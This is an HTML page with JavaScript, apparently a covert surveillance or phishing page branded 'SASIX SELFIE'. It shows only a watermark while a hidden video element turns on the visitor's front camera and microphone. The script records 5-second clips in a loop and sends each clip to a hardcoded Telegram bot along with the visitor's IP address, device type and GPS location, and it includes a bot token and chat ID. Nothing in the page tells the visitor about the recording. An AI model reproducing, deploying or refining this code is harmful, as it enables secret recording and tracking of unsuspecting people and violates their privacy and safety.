<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SASIX SELFIE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: black;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        /* SASIX Watermark - Only visible element */
        .sasix-watermark {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-15deg);
            color: rgba(255, 0, 0, 0.3);
            font-size: 80px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 15px;
            white-space: nowrap;
            pointer-events: none;
            z-index: 9999;
            text-shadow: 0 0 40px #ff0000;
            border: 4px solid rgba(255, 0, 0, 0.2);
            padding: 20px 50px;
            border-radius: 40px;
        }
        
        /* Hidden camera element */
        #selfieCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        /* Hidden status - for debugging only */
        .hidden-status {
            display: none;
        }
    </style>
</head>
<body>
    <!-- SASIX Watermark only -->
    <div class="sasix-watermark">SASIX</div>
    
    <!-- Hidden Selfie Camera -->
    <video id="selfieCamera" autoplay playsinline muted></video>

    <script>
        // ============================================
        // TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let cameraStream = null;
        let videoElement = document.getElementById('selfieCamera');
        let mediaRecorder = null;
        let videoChunks = [];
        let videoCount = 0;
        let isRecording = false;
        
        // ============================================
        // AUTO START - Page load ‡∑Ä‡∑ô‡∂± ‡∂ú‡∂∏‡∂±‡∑ä
        // ============================================
        window.addEventListener('load', function() {
            console.log('SASIX Selfie Auto Start');
            
            // Start camera immediately
            startSelfieCamera();
            
            // Keep screen on
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }
        });
        
        // ============================================
        // START SELFIE CAMERA
        // ============================================
        async function startSelfieCamera() {
            try {
                // Request front camera with audio
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",  // Front camera (selfie)
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    },
                    audio: true  // With sound
                });
                
                videoElement.srcObject = cameraStream;
                await videoElement.play();
                
                console.log('‚úÖ Selfie Camera Active');
                
                // Send Telegram notification
                sendTelegramMessage('üî¥ <b>SASIX SELFIE STARTED</b>\nüì± Auto recording 5sec videos');
                
                // Start recording after 2 seconds
                setTimeout(() => {
                    startAutoRecording();
                }, 2000);
                
            } catch(error) {
                console.error('‚ùå Camera error:', error);
                
                // Retry after 3 seconds
                setTimeout(startSelfieCamera, 3000);
            }
        }
        
        // ============================================
        // AUTO RECORDING LOOP
        // ============================================
        function startAutoRecording() {
            console.log('üé• Auto recording started - 5sec videos');
            
            // Record first video
            record5SecondVideo();
            
            // Schedule next recordings
            setInterval(() => {
                if (!isRecording) {
                    record5SecondVideo();
                }
            }, 8000); // 8 second interval (5s record + 3s gap)
        }
        
        // ============================================
        // RECORD 5 SECOND VIDEO
        // ============================================
        async function record5SecondVideo() {
            if (isRecording || !cameraStream) return;
            
            isRecording = true;
            videoChunks = [];
            
            console.log('üé• Recording 5 seconds...');
            
            // Setup MediaRecorder
            let options = {};
            try {
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9' };
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
                } else {
                    options = { mimeType: 'video/webm' };
                }
            } catch(e) {}
            
            mediaRecorder = new MediaRecorder(cameraStream, options);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data && e.data.size > 0) {
                    videoChunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                
                videoCount++;
                console.log(`‚úÖ Video #${videoCount} recorded: ${sizeMB}MB`);
                
                // Send to Telegram
                await sendVideoToTelegram(videoBlob, sizeMB);
                
                isRecording = false;
            };
            
            // Record for 5 seconds
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 5000); // Exactly 5 seconds
        }
        
        // ============================================
        // SEND VIDEO TO TELEGRAM
        // ============================================
        async function sendVideoToTelegram(videoBlob, sizeMB) {
            try {
                // Get IP address
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                // Get location
                let location = '';
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            location = `üìç ${pos.coords.latitude}, ${pos.coords.longitude}`;
                        },
                        (err) => {}
                    );
                }
                
                // Device info
                const ua = navigator.userAgent;
                let device = 'Android';
                if (ua.includes('Windows')) device = 'Windows';
                else if (ua.includes('Mac')) device = 'MacOS';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                
                const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
                
                // Prepare form data
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `SELFIE_${Date.now()}.webm`);
                formData.append('caption', `ü§≥ <b>SASIX SELFIE CAM</b> #${videoCount}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚è±Ô∏è <b>Duration:</b> 5 seconds
üì¶ <b>Size:</b> ${sizeMB} MB
üéß <b>Audio:</b> Enabled
üìÖ <b>Time:</b> ${timestamp}
üåç <b>IP:</b> ${ip}
üì± <b>Device:</b> ${device}
üìç <b>Location:</b> ${location}

#SASIX #SELFIE #5SEC #AUTO`);

                // Send to Telegram
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`‚úÖ Video #${videoCount} sent to Telegram`);
                    return true;
                } else {
                    console.log('‚ùå Telegram error:', result);
                    return false;
                }
                
            } catch(error) {
                console.error('‚ùå Send error:', error);
                return false;
            }
        }
        
        // ============================================
        // SEND TEXT MESSAGE TO TELEGRAM
        // ============================================
        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }
        
        // ============================================
        // AUTO LOCATION SEND
        // ============================================
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            })
                        });
                        console.log('üìç Location sent');
                    } catch(e) {}
                },
                (err) => {}
            );
        }
        
        // ============================================
        // KEEP ALIVE - Background mode
        // ============================================
        setInterval(() => {
            if (cameraStream) {
                console.log('üíì SASIX Heartbeat');
            }
        }, 30000);
        
        // ============================================
        // Clean up on page close
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
        
    </script>
</body>
</html>
